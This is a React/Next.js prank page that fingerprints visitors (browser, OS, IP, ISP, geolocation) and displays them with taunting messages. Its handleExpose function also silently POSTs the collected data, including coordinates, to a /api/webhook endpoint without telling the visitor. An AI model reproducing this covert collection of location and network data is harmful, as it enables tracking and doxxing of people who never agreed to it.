'use client'

import { useState, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import Head from "next/head"
import { Monitor, Globe, MapPin, ChevronRight, AlertTriangle, Cpu, Wifi } from "lucide-react"

interface DevInfo {
  browser: string;
  ip: string;
  coordinates?: { latitude: number; longitude: number };
  isp: string;
  device: string;
  os: string;
}

export default function EnhancedDevExposed() {
  const [devInfo, setDevInfo] = useState<DevInfo>({
    browser: "",
    ip: "Fetching IP...",
    isp: "ISP information unavailable",
    device: "Detecting device...",
    os: "Detecting OS...",
  })
  const [exposed, setExposed] = useState<boolean>(false)
  const [exposeMessage, setExposeMessage] = useState<string>("")
  const [command, setCommand] = useState<string>("")

  useEffect(() => {
    const updateDevInfo = async () => {
      const ua = navigator.userAgent
      const browserRegex = /(chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i
      const [, browser] = ua.match(browserRegex) || []

      setDevInfo((prev) => ({
        ...prev,
        browser: browser || "Unknown",
        device: /mobile/i.test(ua) ? 'Mobile' : 'Desktop',
        os: navigator.platform,
      }))

      try {
        const response = await fetch("/api/ip")
        const data = await response.json()
        setDevInfo((prev) => ({
          ...prev,
          ip: data.ip || "Unable to fetch IP",
          isp: data.isp || "ISP information unavailable",
        }))
      } catch (error) {
        console.error("Error fetching IP address:", error)
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            setDevInfo((prev) => ({
              ...prev,
              coordinates: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
              },
            }))
          },
          (error) => {
            console.error("Error getting geolocation:", error)
          }
        )
      }
    }

    updateDevInfo()
  }, [])

  const handleExpose = () => {
    setExposed(true)
    const randomLines = [
      "You thought you were incognito? Nah fam.",
      "Caught ya red-handed, my dude!",
      "Welcome to the club, you're officially exposed!",
      "Not so sneaky now, are we?",
      "Guess you can't hide from the internet, huh?",
      "Oopsie, looks like someone's not in stealth mode!",
      "Surprise! You can't escape the digital eye!",
    ]
    const randomLine = randomLines[Math.floor(Math.random() * randomLines.length)]
    setExposeMessage(randomLine)
    sendToWebhook()
  }

  const sendToWebhook = async () => {
    try {
      await fetch("/api/webhook", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(devInfo),
      })
    } catch (error) {
      console.error("Error sending data to webhook:", error)
    }
  }

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (command.trim().toLowerCase() === "expose") {
      handleExpose()
    }
    setCommand("")
  }

  const infoVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 },
  }

  return (
    <>
      <Head>
        <title>Seduce - Shrvan Benke</title>
        <meta name="description" content="Bro, get ready to be roasted by the code!" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="min-h-screen flex flex-col bg-gradient-to-br from-[#F5E6D3] to-[#E6D0B8] text-[#2C3E50] font-mono p-8">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="flex-grow max-w-3xl mx-auto w-full"
        >
          <div className="mb-6">
            <h1 className="text-4xl font-bold text-[#34495E] tracking-tight">Seduce</h1>
          </div>
          <div className="bg-[#ECE0C8] text-[#2C3E50] p-6 rounded-lg shadow-lg mb-8 border border-[#D1B894]">
            <AnimatePresence mode="wait">
              {!exposed ? (
                <motion.div
                  key="unexposed"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  transition={{ duration: 0.3 }}
                >
                  <p className="text-2xl font-bold mb-4 text-[#34495E]">Yo, you think you're slick?</p>
                  <p className="text-xl mb-4 text-[#34495E]">Type "expose" in the command below:</p>
                  <form
                    onSubmit={handleCommandSubmit}
                    className="flex items-center bg-[#ECE0C8] text-[#2C3E50] p-4 rounded-lg shadow-md"
                  >
                    <ChevronRight size={18} className="mr-2 text-[#34495E]" />
                    <input
                      type="text"
                      value={command}
                      onChange={(e) => setCommand(e.target.value)}
                      className="flex-grow bg-transparent outline-none text-[#2C3E50]"
                      placeholder="Type 'expose' to reveal!"
                    />
                  </form>
                </motion.div>
              ) : (
                <motion.div
                  key="exposed"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  transition={{ duration: 0.3 }}
                >
                  <motion.p
                    className="text-2xl font-bold mb-4 text-[#E74C3C]"
                    initial={{ scale: 0.9 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", stiffness: 300, damping: 10 }}
                  >
                    <AlertTriangle className="inline-block mr-2" />
                    {exposeMessage}
                  </motion.p>
                  <motion.div
                    initial="hidden"
                    animate="visible"
                    variants={{
                      visible: { transition: { staggerChildren: 0.1 } },
                    }}
                    className="grid grid-cols-1 md:grid-cols-2 gap-4"
                  >
                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
                      <Monitor className="mr-2 text-[#34495E]" />
                      <span className="font-semibold">Browser:</span> {devInfo.browser}
                    </motion.div>
                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
                      <Globe className="mr-2 text-[#34495E]" />
                      <span className="font-semibold">Your IP:</span> {devInfo.ip}
                    </motion.div>
                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
                      <Wifi className="mr-2 text-[#34495E]" />
                      <span className="font-semibold">ISP:</span> {devInfo.isp}
                    </motion.div>
                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
                      <Cpu className="mr-2 text-[#34495E]" />
                      <span className="font-semibold">Device:</span> {devInfo.device}
                    </motion.div>
                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
                      <Monitor className="mr-2 text-[#34495E]" />
                      <span className="font-semibold">OS:</span> {devInfo.os}
                    </motion.div>
                    {devInfo.coordinates && (
                      <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg col-span-full">
                        <MapPin className="mr-2 text-[#34495E]" />
                        <span className="font-semibold">Your Location:</span> {devInfo.coordinates.latitude.toFixed(4)}, {devInfo.coordinates.longitude.toFixed(4)}
                      </motion.div>
                    )}
                  </motion.div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </motion.div>
      </div>
    </>
  )
}